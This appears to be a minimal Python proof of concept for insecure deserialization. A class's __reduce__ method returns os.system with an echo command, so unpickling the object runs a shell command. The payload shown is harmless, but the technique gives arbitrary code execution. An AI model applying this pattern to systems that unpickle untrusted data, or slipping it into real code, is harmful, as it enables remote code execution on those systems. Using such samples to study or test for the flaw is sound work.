import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked!"',))

def serialize_and_deserialize():
    data = pickle.dumps(VulnerableClass())
    deserialized_data = pickle.loads(data)
    return deserialized_data

serialize_and_deserialize()
